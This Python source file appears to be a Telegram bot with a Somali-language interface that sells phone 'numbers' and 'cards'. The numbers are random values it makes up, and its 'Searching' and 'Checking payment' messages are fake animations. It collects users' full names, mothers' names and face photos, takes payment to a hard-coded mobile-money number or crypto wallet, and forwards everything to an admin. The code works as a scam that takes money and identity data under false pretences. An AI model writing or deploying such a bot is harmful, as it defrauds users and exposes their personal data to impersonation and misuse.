import asyncio
import logging
import random
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

# ================= CONFIG =================
BOT_TOKEN = "PASTE_YOUR_BOT_TOKEN_HERE"
ADMIN_ID = 123456789  # Ku qor Telegram ID-gaaga
LOCAL_NUMBER = "+252907868526"

BNB_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
USDT_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"

bot = Bot(BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

users = {}

# ================= STATES =================
class CardState(StatesGroup):
    fullname = State()
    mother = State()
    face = State()
    screenshot = State()

class CodeState(StatesGroup):
    code = State()

class AskState(StatesGroup):
    msg = State()

# ================= HELPERS =================
def random_number():
    return "+25263" + "".join(str(random.randint(0,9)) for _ in range(7))

def vip_number():
    d = str(random.randint(4,9))
    return "+25263" + d*3 + str(random.randint(0,9)) + d*3

def generate_code():
    return "".join(random.choices("0123456789", k=6))

async def live_animation(message, text_list, seconds=10):
    for i in range(seconds):
        await asyncio.sleep(1)
        await message.edit_text(text_list[i % len(text_list)])

# ================= START =================
@dp.message(Command("start"))
async def start(msg: Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="New Order"), KeyboardButton(text="Check Code")]],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Service Bot 🤖", reply_markup=kb)

# ================= NEW ORDER =================
@dp.message(F.text == "New Order")
async def new_order(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL ($0.8)", callback_data="virtual")],
        [InlineKeyboardButton(text="CARD", callback_data="card")]
    ])
    await msg.answer("Dooro adeeg:", reply_markup=kb)

# ================= CHECK CODE =================
@dp.message(F.text == "Check Code")
async def check_code(msg: Message, state: FSMContext):
    await msg.answer("Geli Code-kaaga:")
    await state.set_state(CodeState.code)

@dp.message(CodeState.code)
async def process_code(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    if uid in users and users[uid].get("code") == msg.text:
        await msg.answer(f"✅ Code sax ah\nNumber-kaaga:\n{users[uid]['number']}")
    else:
        await msg.answer("❌ Code khaldan")
    await state.clear()

# ================= VIRTUAL =================
@dp.callback_query(F.data == "virtual")
async def virtual(call: CallbackQuery):
    number = random_number()
    users[call.from_user.id] = {
        "type": "virtual",
        "number": number,
        "amount": "$0.8"
    }
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="v_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="v_crypto")]
    ])
    await call.message.edit_text(
        f"Number: {number}\nQiimaha: $0.8\nDooro Payment Method:",
        reply_markup=kb
    )

@dp.callback_query(F.data == "v_local")
async def v_local(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="confirm_payment")]
    ])
    await call.message.edit_text(
        f"Lacagta ku dir number-kan:\n{LOCAL_NUMBER}",
        reply_markup=kb
    )

@dp.callback_query(F.data == "v_crypto")
async def v_crypto(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="confirm_payment")]
    ])
    await call.message.edit_text(
        f"Send Crypto:\n\nBNB:\n`{BNB_ADDRESS}`\n\nUSDT-BEP20:\n`{USDT_ADDRESS}`\n\nTaabo si copy uu noqdo.",
        parse_mode="Markdown",
        reply_markup=kb
    )

# ================= CARD =================
@dp.callback_query(F.data == "card")
async def card(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIP - $15", callback_data="vip")],
        [InlineKeyboardButton(text="NORMAL - $1", callback_data="normal")]
    ])
    await call.message.edit_text("Dooro nooca Card:", reply_markup=kb)

@dp.callback_query(F.data.in_(["vip","normal"]))
async def card_type(call: CallbackQuery, state: FSMContext):
    number = vip_number() if call.data=="vip" else random_number()
    users[call.from_user.id] = {
        "type":"card",
        "number":number,
        "amount":"$15" if call.data=="vip" else "$1"
    }
    await call.message.answer("Geli Magacaaga Saddexan:")
    await state.set_state(CardState.fullname)

@dp.message(CardState.fullname)
async def fullname(msg: Message, state: FSMContext):
    if len(msg.text.split()) < 3:
        await msg.answer("Fadlan geli 3 magac sax ah.")
        return
    users[msg.from_user.id]["name"] = msg.text
    await msg.answer("Geli Magaca Hooyada:")
    await state.set_state(CardState.mother)

@dp.message(CardState.mother)
async def mother(msg: Message, state: FSMContext):
    users[msg.from_user.id]["mother"] = msg.text
    await msg.answer("Soo dir Sawirka Wajigaaga:")
    await state.set_state(CardState.face)

@dp.message(CardState.face, F.photo)
async def face(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    users[uid]["face"] = msg.photo[-1].file_id
    m = await msg.answer("Searching...")
    await live_animation(m, ["Searching.", "Searching..", "Checking...", "Checking...."], 10)
    await msg.answer(
        f"Number: {users[uid]['number']}\nQiimaha: {users[uid]['amount']}\nDooro Payment:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="LOCAL", callback_data="v_local")],
            [InlineKeyboardButton(text="CRYPTO", callback_data="v_crypto")]
        ])
    )

# ================= CONFIRM PAYMENT =================
@dp.callback_query(F.data == "confirm_payment")
async def confirm_payment(call: CallbackQuery, state: FSMContext):
    msg = await call.message.edit_text("Checking payment...")
    await live_animation(msg, ["Checking.", "Checking..", "Checking...", "Checking...."], 10)
    await call.message.answer("Soo dir Screenshot-ka Lacagta:")
    await state.set_state(CardState.screenshot)

# ================= SCREENSHOT TO ADMIN =================
@dp.message(CardState.screenshot, F.photo)
async def screenshot(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    users[uid]["screenshot"] = msg.photo[-1].file_id
    await msg.answer("Waad mahadsantahay 🚀 Dalabkaaga waa la gudbiyay.")

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_confirm_{uid}")],
        [InlineKeyboardButton(text="REJECT", callback_data=f"admin_reject_{uid}")],
        [InlineKeyboardButton(text="ASK", callback_data=f"admin_ask_{uid}")]
    ])

    await bot.send_photo(
        ADMIN_ID,
        users[uid].get("face"),
        caption=f"New Order\nUser:{uid}\nNumber:{users[uid]['number']}\nAmount:{users[uid]['amount']}",
        reply_markup=kb
    )
    await bot.send_photo(ADMIN_ID, users[uid]["screenshot"], caption="Payment Screenshot")
    await state.clear()

# ================= ADMIN ACTIONS =================
@dp.callback_query(F.data.startswith("admin_confirm_"))
async def admin_confirm(call: CallbackQuery):
    uid = int(call.data.split("_")[2])
    code = generate_code()
    users[uid]["code"] = code
    await bot.send_message(uid, f"OTP READY ✅\nCode: {code}")
    await call.message.edit_text("Approved ✅")

@dp.callback_query(F.data.startswith("admin_reject_"))
async def admin_reject(call: CallbackQuery):
    uid = int(call.data.split("_")[2])
    await bot.send_message(uid, "❌ Codsiga waa la diiday. Fadlan lacagta soo dir.")
    await call.message.edit_text("Rejected ❌")

@dp.callback_query(F.data.startswith("admin_ask_"))
async def admin_ask(call: CallbackQuery, state: FSMContext):
    uid = int(call.data.split("_")[2])
    await call.message.answer("Qor fariinta user-ka:")
    await state.update_data(uid=uid)
    await state.set_state(AskState.msg)

@dp.message(AskState.msg)
async def send_ask(msg: Message, state: FSMContext):
    data = await state.get_data()
    await bot.send_message(data["uid"], f"Admin: {msg.text}")
    await msg.answer("Fariinta waa la diray.")
    await state.clear()

# ================= RUN =================
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
